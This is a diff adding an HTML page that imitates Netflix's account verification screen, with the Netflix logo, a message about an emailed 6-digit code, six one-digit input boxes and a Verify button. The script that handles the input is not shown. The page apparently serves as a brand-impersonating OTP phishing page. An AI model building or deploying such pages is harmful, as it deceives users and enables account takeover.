@@ -1,0 +1,38 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Netflix - Verify Your Account</title>
+    <link rel="stylesheet" href="vstyle.css">
+</head>
+<body>
+    <div class="netflix-bg"></div>
+    <div class="container">
+        <div class="otp-card">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/0/08/Netflix_2015_logo.svg" alt="Netflix" class="logo">
+            <h1>Check your email</h1>
+            <p>We've sent a 6-digit code to <strong>user@example.com</strong>. Enter it below to verify your account.</p>
+
+            <div class="otp-inputs" id="otp-inputs">
+                <input type="text" maxlength="1" inputmode="numeric">
+                <input type="text" maxlength="1" inputmode="numeric">
+                <input type="text" maxlength="1" inputmode="numeric">
+                <input type="text" maxlength="1" inputmode="numeric">
+                <input type="text" maxlength="1" inputmode="numeric">
+                <input type="text" maxlength="1" inputmode="numeric">
+            </div>
+
+            <p id="error-msg" class="error-text"></p>
+
+            <button id="verify-btn" class="verify-btn">Verify</button>
+
+            <div class="footer-links">
+                <span>Didn't receive it?</span>
+                <a href="#" id="resend-link">Resend Code</a>
+            </div>
+        </div>
+    </div>
+    <script src="script.js"></script>
+</body>
+</html>
